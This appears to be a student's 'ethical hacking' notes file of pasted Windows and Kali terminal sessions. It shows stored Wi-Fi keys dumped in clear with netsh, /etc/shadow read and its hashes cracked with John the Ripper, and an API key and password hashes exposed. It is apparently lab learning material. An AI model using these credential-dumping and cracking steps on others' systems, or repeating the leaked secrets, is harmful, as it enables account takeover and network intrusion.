ethical hacking
//password change
password overwrite
steps:net user>>net user username>>net user username>>new password
 //wifi inf
netsh>>show wlan>>profiles>>wlan show>>name of wifi
//COMMAND PROMT
Microsoft Windows [Version 10.0.18362.295]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>net user

User accounts for \\LAPTOP-KP38L83K

-------------------------------------------------------------------------------
Administrator            Asus                     DefaultAccount
Guest                    WDAGUtilityAccount
The command completed successfully.


C:\WINDOWS\system32>net user Administrator
User name                    Administrator
Full Name
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               No
Account expires              Never

Password last set            ‎08-‎Sep-‎19 11:26:10 AM
Password expires             Never
Password changeable          ‎08-‎Sep-‎19 11:26:10 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   ‎18-‎Sep-‎18 4:12:56 PM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.


C:\WINDOWS\system32>Asus
'Asus' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>net user

User accounts for \\LAPTOP-KP38L83K

-------------------------------------------------------------------------------
Administrator            Asus                     DefaultAccount
Guest                    WDAGUtilityAccount
The command completed successfully.


C:\WINDOWS\system32>Asus
'Asus' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>netsh
netsh>?

The following commands are available:

Commands in this context:
..             - Goes up one context level.
?              - Displays a list of commands.
abort          - Discards changes made while in offline mode.
add            - Adds a configuration entry to a list of entries.
advfirewall    - Changes to the `netsh advfirewall' context.
alias          - Adds an alias.
bridge         - Changes to the `netsh bridge' context.
bye            - Exits the program.
commit         - Commits changes made while in offline mode.
delete         - Deletes a configuration entry from a list of entries.
dhcpclient     - Changes to the `netsh dhcpclient' context.
dnsclient      - Changes to the `netsh dnsclient' context.
dump           - Displays a configuration script.
exec           - Runs a script file.
exit           - Exits the program.
firewall       - Changes to the `netsh firewall' context.
help           - Displays a list of commands.
http           - Changes to the `netsh http' context.
interface      - Changes to the `netsh interface' context.
ipsec          - Changes to the `netsh ipsec' context.
lan            - Changes to the `netsh lan' context.
mbn            - Changes to the `netsh mbn' context.
namespace      - Changes to the `netsh namespace' context.
netio          - Changes to the `netsh netio' context.
offline        - Sets the current mode to offline.
online         - Sets the current mode to online.
p2p            - Changes to the `netsh p2p' context.
popd           - Pops a context from the stack.
pushd          - Pushes current context on stack.
quit           - Exits the program.
ras            - Changes to the `netsh ras' context.
rpc            - Changes to the `netsh rpc' context.
set            - Updates configuration settings.
show           - Displays information.
trace          - Changes to the `netsh trace' context.
unalias        - Deletes an alias.
wcn            - Changes to the `netsh wcn' context.
wfp            - Changes to the `netsh wfp' context.
winhttp        - Changes to the `netsh winhttp' context.
winsock        - Changes to the `netsh winsock' context.
wlan           - Changes to the `netsh wlan' context.

The following sub-contexts are available:
 advfirewall bridge dhcpclient dnsclient firewall http interface ipsec lan mbn namespace netio p2p ras rpc trace wcn wfp winhttp winsock wlan

To view help for a command, type the command, followed by a space, and then
 type ?.

netsh>wlan show profiles

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : JioNet@LPU
    All User Profile     : Redmi
    All User Profile     : LPU Wireless

netsh>Redmi
The following command was not found: Redmi.
netsh>wlan show profile Redmi

Profile Redmi on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : Redmi
    Control options        :
        Connection mode    : Connect manually
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "Redmi"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default

netsh>?

The following commands are available:

Commands in this context:
..             - Goes up one context level.
?              - Displays a list of commands.
abort          - Discards changes made while in offline mode.
add            - Adds a configuration entry to a list of entries.
advfirewall    - Changes to the `netsh advfirewall' context.
alias          - Adds an alias.
bridge         - Changes to the `netsh bridge' context.
bye            - Exits the program.
commit         - Commits changes made while in offline mode.
delete         - Deletes a configuration entry from a list of entries.
dhcpclient     - Changes to the `netsh dhcpclient' context.
dnsclient      - Changes to the `netsh dnsclient' context.
dump           - Displays a configuration script.
exec           - Runs a script file.
exit           - Exits the program.
firewall       - Changes to the `netsh firewall' context.
help           - Displays a list of commands.
http           - Changes to the `netsh http' context.
interface      - Changes to the `netsh interface' context.
ipsec          - Changes to the `netsh ipsec' context.
lan            - Changes to the `netsh lan' context.
mbn            - Changes to the `netsh mbn' context.
namespace      - Changes to the `netsh namespace' context.
netio          - Changes to the `netsh netio' context.
offline        - Sets the current mode to offline.
online         - Sets the current mode to online.
p2p            - Changes to the `netsh p2p' context.
popd           - Pops a context from the stack.
pushd          - Pushes current context on stack.
quit           - Exits the program.
ras            - Changes to the `netsh ras' context.
rpc            - Changes to the `netsh rpc' context.
set            - Updates configuration settings.
show           - Displays information.
trace          - Changes to the `netsh trace' context.
unalias        - Deletes an alias.
wcn            - Changes to the `netsh wcn' context.
wfp            - Changes to the `netsh wfp' context.
winhttp        - Changes to the `netsh winhttp' context.
winsock        - Changes to the `netsh winsock' context.
wlan           - Changes to the `netsh wlan' context.

The following sub-contexts are available:
 advfirewall bridge dhcpclient dnsclient firewall http interface ipsec lan mbn namespace netio p2p ras rpc trace wcn wfp winhttp winsock wlan

To view help for a command, type the command, followed by a space, and then
 type ?.

netsh>wlan show profiles

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : JioNet@LPU
    All User Profile     : Redmi
    All User Profile     : LPU Wireless

netsh>wlan show profiles Redmi

Profile Redmi on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : Redmi
    Control options        :
        Connection mode    : Connect manually
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "Redmi"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default

netsh>wlan show profiles Redmi key=clear

Profile Redmi on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : Redmi
    Control options        :
        Connection mode    : Connect manually
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "Redmi"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : 99999999

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default

netsh>wlan show profiles "LPU Wireless" key=clear

Profile LPU Wireless on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : LPU Wireless
    Control options        :
        Connection mode    : Connect manually
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "LPU Wireless"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : 123456789a

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default

netsh>
netsh>



//LINUX TERMINAL
root@kali:~# john
Created directory: /root/.john
John the Ripper 1.9.0-jumbo-1 OMP [linux-gnu 64-bit x86_64 AVX AC]
Copyright (c) 1996-2019 by Solar Designer and others
Homepage: http://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]
--single[=SECTION[,..]]    "single crack" mode, using default or named rules
--single=:rule[,..]        same, using "immediate" rule(s)
--wordlist[=FILE] --stdin  wordlist mode, read words from FILE or stdin
                  --pipe   like --stdin, but bulk reads, and allows rules
--loopback[=FILE]          like --wordlist, but extract words from a .pot file
--dupe-suppression         suppress all dupes in wordlist (and force preload)
--prince[=FILE]            PRINCE mode, read words from FILE
--encoding=NAME            input encoding (eg. UTF-8, ISO-8859-1). See also
                           doc/ENCODINGS and --list=hidden-options.
--rules[=SECTION[,..]]     enable word mangling rules (for wordlist or PRINCE
                           modes), using default or named rules
--rules=:rule[;..]]        same, using "immediate" rule(s)
--rules-stack=SECTION[,..] stacked rules, applied after regular rules or to
                           modes that otherwise don't support rules
--rules-stack=:rule[;..]   same, using "immediate" rule(s)
--incremental[=MODE]       "incremental" mode [using section MODE]
--mask[=MASK]              mask mode using MASK (or default from john.conf)
--markov[=OPTIONS]         "Markov" mode (see doc/MARKOV)
--external=MODE            external mode or word filter
--subsets[=CHARSET]        "subsets" mode (see doc/SUBSETS)
--stdout[=LENGTH]          just output candidate passwords [cut at LENGTH]
--restore[=NAME]           restore an interrupted session [called NAME]
--session=NAME             give a new session the NAME
--status[=NAME]            print status of a session [called NAME]
--make-charset=FILE        make a charset file. It will be overwritten
--show[=left]              show cracked passwords [if =left, then uncracked]
--test[=TIME]              run tests and benchmarks for TIME seconds each
--users=[-]LOGIN|UID[,..]  [do not] load this (these) user(s) only
--groups=[-]GID[,..]       load users [not] of this (these) group(s) only
--shells=[-]SHELL[,..]     load users with[out] this (these) shell(s) only
--salts=[-]COUNT[:MAX]     load salts with[out] COUNT [to MAX] hashes
--costs=[-]C[:M][,...]     load salts with[out] cost value Cn [to Mn]. For
                           tunable cost parameters, see doc/OPTIONS
--save-memory=LEVEL        enable memory saving, at LEVEL 1..3
--node=MIN[-MAX]/TOTAL     this node's number range out of TOTAL count
--fork=N                   fork N processes
--pot=NAME                 pot file to use
--list=WHAT                list capabilities, see --list=help or doc/OPTIONS
--format=NAME              force hash of type NAME. The supported formats can
                           be seen with --list=formats and --list=subformats

root@kali:~# who
root     :1           2019-09-08 00:26 (:1)
root@kali:~# who am i
root@kali:~# whoami
root
root@kali:~# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
root@kali:~# ls -l
total 32
drwxr-xr-x 2 root root 4096 Aug 30 10:18 Desktop
drwxr-xr-x 2 root root 4096 Aug 30 10:08 Documents
drwxr-xr-x 2 root root 4096 Aug 30 10:08 Downloads
drwxr-xr-x 2 root root 4096 Aug 30 10:08 Music
drwxr-xr-x 2 root root 4096 Aug 30 10:08 Pictures
drwxr-xr-x 2 root root 4096 Aug 30 10:08 Public
drwxr-xr-x 2 root root 4096 Aug 30 10:08 Templates
drwxr-xr-x 2 root root 4096 Aug 30 10:08 Videos
root@kali:~# ls -la
total 128
drwxr-xr-x 19 root root  4096 Sep  8 02:43 .
drwxr-xr-x 19 root root 36864 Aug 30 10:23 ..
-rw-r--r--  1 root root    30 Sep  8 02:39 .bash_history
-rw-r--r--  1 root root  3391 Aug 27 06:32 .bashrc
drwx------  4 root root  4096 Sep  8 02:25 .BurpSuite
drwx------  8 root root  4096 Sep  8 01:11 .cache
drwxr-xr-x 14 root root  4096 Sep  8 02:22 .config
drwxr-xr-x  2 root root  4096 Aug 30 10:18 Desktop
drwxr-xr-x  2 root root  4096 Aug 30 10:08 Documents
drwxr-xr-x  2 root root  4096 Aug 30 10:08 Downloads
drwx------  3 root root  4096 Aug 30 10:08 .gnupg
-rw-------  1 root root   926 Sep  8 00:26 .ICEauthority
drwxr-xr-x  4 root root  4096 Sep  8 02:24 .java
drwx------  2 root root  4096 Sep  8 02:43 .john
drwx------  3 root root  4096 Aug 30 10:08 .local
drwx------  5 root root  4096 Sep  8 01:11 .mozilla
drwxr-xr-x  2 root root  4096 Aug 30 10:08 Music
drwxr-xr-x  2 root root  4096 Aug 30 10:08 Pictures
-rw-r--r--  1 root root   148 Jul 23 13:22 .profile
drwxr-xr-x  2 root root  4096 Aug 30 10:08 Public
drwxr-xr-x  2 root root  4096 Aug 30 10:08 Templates
drwxr-xr-x  2 root root  4096 Aug 30 10:08 Videos
drwxr-xr-x  2 root root  4096 Sep  8 02:28 .zenmap
root@kali:~# adduser Ankit
adduser: Please enter a username matching the regular expression configured
via the NAME_REGEX configuration variable.  Use the `--force-badname'
option to relax this check or reconfigure NAME_REGEX.
root@kali:~# adduser ankit
Adding user `ankit' ...
Adding new group `ankit' (1000) ...
Adding new user `ankit' (1000) with group `ankit' ...
Creating home directory `/home/ankit' ...
Copying files from `/etc/skel' ...
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for ankit
Enter the new value, or press ENTER for the default
	Full Name []: 
	Room Number []: 
	Work Phone []: 
	Home Phone []: 
	Other []: 
Is the information correct? [Y/n] 
root@kali:~# y
bash: y: command not found
root@kali:~# Y
bash: Y: command not found
root@kali:~# adduser me
Adding user `me' ...
Adding new group `me' (1001) ...
Adding new user `me' (1001) with group `me' ...
Creating home directory `/home/me' ...
Copying files from `/etc/skel' ...
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for me
Enter the new value, or press ENTER for the default
	Full Name []: 
	Room Number []: 
	Work Phone []: 
	Home Phone []: 
	Other []: 
Is the information correct? [Y/n] Y
root@kali:~# me
bash: me: command not found
root@kali:~# cat/etc/passwd
bash: cat/etc/passwd: No such file or directory
root@kali:~# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false
ntp:x:105:111::/nonexistent:/usr/sbin/nologin
messagebus:x:106:112::/nonexistent:/usr/sbin/nologin
Debian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin
uuidd:x:108:115::/run/uuidd:/usr/sbin/nologin
redsocks:x:109:116::/var/run/redsocks:/usr/sbin/nologin
tss:x:110:117:TPM2 software stack,,,:/var/lib/tpm:/bin/false
rwhod:x:111:65534::/var/spool/rwho:/usr/sbin/nologin
iodine:x:112:65534::/var/run/iodine:/usr/sbin/nologin
stunnel4:x:113:120::/var/run/stunnel4:/usr/sbin/nologin
miredo:x:114:65534::/var/run/miredo:/usr/sbin/nologin
dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
sslh:x:116:122::/nonexistent:/usr/sbin/nologin
postgres:x:117:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:118:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:119:126:RealtimeKit,,,:/proc:/usr/sbin/nologin
_rpc:x:120:65534::/run/rpcbind:/usr/sbin/nologin
Debian-snmp:x:121:128::/var/lib/snmp:/bin/false
statd:x:122:65534::/var/lib/nfs:/usr/sbin/nologin
inetsim:x:123:129::/var/lib/inetsim:/usr/sbin/nologin
sshd:x:124:65534::/run/sshd:/usr/sbin/nologin
pulse:x:125:131:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:126:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:127:134:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:128:135::/var/lib/saned:/usr/sbin/nologin
colord:x:129:137:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:130:138::/var/lib/geoclue:/usr/sbin/nologin
king-phisher:x:131:139::/var/lib/king-phisher:/usr/sbin/nologin
Debian-gdm:x:132:140:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ankit:x:1000:1000:,,,:/home/ankit:/bin/bash
me:x:1001:1001:,,,:/home/me:/bin/bash
root@kali:~# 
root@kali:~# 






















































root@kali:~# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false
ntp:x:105:111::/nonexistent:/usr/sbin/nologin
messagebus:x:106:112::/nonexistent:/usr/sbin/nologin
Debian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin
uuidd:x:108:115::/run/uuidd:/usr/sbin/nologin
redsocks:x:109:116::/var/run/redsocks:/usr/sbin/nologin
tss:x:110:117:TPM2 software stack,,,:/var/lib/tpm:/bin/false
rwhod:x:111:65534::/var/spool/rwho:/usr/sbin/nologin
iodine:x:112:65534::/var/run/iodine:/usr/sbin/nologin
stunnel4:x:113:120::/var/run/stunnel4:/usr/sbin/nologin
miredo:x:114:65534::/var/run/miredo:/usr/sbin/nologin
dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
sslh:x:116:122::/nonexistent:/usr/sbin/nologin
postgres:x:117:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:118:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:119:126:RealtimeKit,,,:/proc:/usr/sbin/nologin
_rpc:x:120:65534::/run/rpcbind:/usr/sbin/nologin
Debian-snmp:x:121:128::/var/lib/snmp:/bin/false
statd:x:122:65534::/var/lib/nfs:/usr/sbin/nologin
inetsim:x:123:129::/var/lib/inetsim:/usr/sbin/nologin
sshd:x:124:65534::/run/sshd:/usr/sbin/nologin
pulse:x:125:131:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:126:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:127:134:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:128:135::/var/lib/saned:/usr/sbin/nologin
colord:x:129:137:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:130:138::/var/lib/geoclue:/usr/sbin/nologin
king-phisher:x:131:139::/var/lib/king-phisher:/usr/sbin/nologin
Debian-gdm:x:132:140:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ankit:x:1000:1000:,,,:/home/ankit:/bin/bash
me:x:1001:1001:,,,:/home/me:/bin/bash
root@kali:~# cat /etc/shadow
root:$6$uo1WrQjAZoG.G7KG$ZaFt1kt7muYj6G88VseVaojd8GPK3vaoaNcmhJI8Xnm.XF92auAvJUWtXJSpCOFihQ3QNb7NQ/Gyibrb8Qh36/:18138:0:99999:7:::
daemon:*:18135:0:99999:7:::
bin:*:18135:0:99999:7:::
sys:*:18135:0:99999:7:::
sync:*:18135:0:99999:7:::
games:*:18135:0:99999:7:::
man:*:18135:0:99999:7:::
lp:*:18135:0:99999:7:::
mail:*:18135:0:99999:7:::
news:*:18135:0:99999:7:::
uucp:*:18135:0:99999:7:::
proxy:*:18135:0:99999:7:::
www-data:*:18135:0:99999:7:::
backup:*:18135:0:99999:7:::
list:*:18135:0:99999:7:::
irc:*:18135:0:99999:7:::
gnats:*:18135:0:99999:7:::
nobody:*:18135:0:99999:7:::
_apt:*:18135:0:99999:7:::
systemd-timesync:*:18135:0:99999:7:::
systemd-network:*:18135:0:99999:7:::
systemd-resolve:*:18135:0:99999:7:::
mysql:!:18135:0:99999:7:::
ntp:*:18135:0:99999:7:::
messagebus:*:18135:0:99999:7:::
Debian-exim:!:18135:0:99999:7:::
uuidd:*:18135:0:99999:7:::
redsocks:!:18135:0:99999:7:::
tss:*:18135:0:99999:7:::
rwhod:*:18135:0:99999:7:::
iodine:*:18135:0:99999:7:::
stunnel4:!:18135:0:99999:7:::
miredo:*:18135:0:99999:7:::
dnsmasq:*:18135:0:99999:7:::
sslh:!:18135:0:99999:7:::
postgres:*:18135:0:99999:7:::
usbmux:*:18135:0:99999:7:::
rtkit:*:18135:0:99999:7:::
_rpc:*:18135:0:99999:7:::
Debian-snmp:!:18135:0:99999:7:::
statd:*:18135:0:99999:7:::
inetsim:*:18135:0:99999:7:::
sshd:*:18135:0:99999:7:::
pulse:*:18135:0:99999:7:::
speech-dispatcher:!:18135:0:99999:7:::
avahi:*:18135:0:99999:7:::
saned:*:18135:0:99999:7:::
colord:*:18135:0:99999:7:::
geoclue:*:18135:0:99999:7:::
king-phisher:*:18135:0:99999:7:::
Debian-gdm:*:18135:0:99999:7:::
systemd-coredump:!!:18138::::::
ankit:$6$EvsoCESd05A3dIFs$L1oCR6h3GSqnmzRRZh9kXhSQUDeFHwmzrxkMp3vhDsbZSx9oAE1CNhc2MUi9ul5dn/Yaee6eSZJ5ed/3UNCuV0:18147:0:99999:7:::
me:$6$1ACL7NroO9Q.jR7m$rwwqmaRwwZ2fD.aKRs37kDvj1PJGgcjlZjxiRhybZRDWB1vuJvdrMUcxpWuVC8tiMjGSxnFhwtXQLhkd68Usr0:18147:0:99999:7:::
root@kali:~# john /etc/shadow
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
toor             (root)
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
12345            (me)
12345            (ankit)
3g 0:00:00:01 DONE 2/3 (2019-09-08 03:03) 1.515g/s 3126p/s 3258c/s 3258C/s 123456..franklin
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~# cd desktop
bash: cd: desktop: No such file or directory
root@kali:~# cd Desktop
root@kali:~/Desktop# rm ~/ .john/john.pot
rm: cannot remove '/root/': Is a directory
rm: cannot remove '.john/john.pot': No such file or directory
root@kali:~/Desktop# rm ~/.john/john.pot
root@kali:~/Desktop# cd Desktop
bash: cd: Desktop: No such file or directory
root@kali:~/Desktop# cd Desktop pwd
bash: cd: too many arguments
root@kali:~/Desktop# pwd
/root/Desktop
root@kali:~/Desktop# touch new.txt
root@kali:~/Desktop# zip2john
Usage: zip2john [options] [zip file(s)]
Options for 'old' PKZIP encrypted files only:
 -a <filename>   This is a 'known' ASCII file. This can be faster, IF all
    files are larger, and you KNOW that at least one of them starts out as
    'pure' ASCII data.
 -o <filename>   Only use this file from the .zip file.
 -c This will create a 'checksum only' hash.  If there are many encrypted
    files in the .zip file, then this may be an option, and there will be
    enough data that false positives will not be seen.  If the .zip is 2
    byte checksums, and there are 3 or more of them, then we have 48 bits
    knowledge, which 'may' be enough to crack the password, without having
    to force the user to have the .zip file present.
 -m Use "file magic" as known-plain if applicable. This can be faster but
    not 100% safe in all situations.
 -2 Force 2 byte checksum computation.

NOTE: By default it is assumed that all files in each archive have the same
password. If that's not the case, the produced hash may be uncrackable.
To avoid this, use -o option to pick a file at a time.
root@kali:~/Desktop# Zip2john new.Zip>new.txt
bash: Zip2john: command not found
root@kali:~/Desktop# zip2john new.zip> new.txt
ver 81.9 new.zip/new.txt is not encrypted, or stored with non-handled compression type
root@kali:~/Desktop# zip2john new.zip > new.txt
ver 81.9 new.zip/new.txt is not encrypted, or stored with non-handled compression type
root@kali:~/Desktop# john --format=zip new.txt
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
root@kali:~/Desktop# zip2john new.zip > new.txt
ver 81.9 new.zip/new.txt is not encrypted, or stored with non-handled compression type
root@kali:~/Desktop# 



////SQL INJCTION
api key=6087bb14c88b6d9d00806b57f5cf9600097e011cf1a4d7666268b8343402354a
                                      

oot@kali:~# sqlmap
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.3.8#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python2 sqlmap [options]

sqlmap: error: missing a mandatory option (-d, -u, -l, -m, -r, -g, -c, -x, --list-tampers, --wizard, --update, --purge or --dependencies). Use -h for basic and -hh for advanced help

root@kali:~# ping google.com
PING google.com (172.217.167.206) 56(84) bytes of data.
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=1 ttl=128 time=1950 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=3 ttl=128 time=90.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=4 ttl=128 time=71.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=5 ttl=128 time=220 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=6 ttl=128 time=125 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=7 ttl=128 time=166 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=8 ttl=128 time=125 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=9 ttl=128 time=313 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=10 ttl=128 time=262 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=11 ttl=128 time=92.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=12 ttl=128 time=69.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=13 ttl=128 time=137 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=14 ttl=128 time=158 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=15 ttl=128 time=94.8 ms
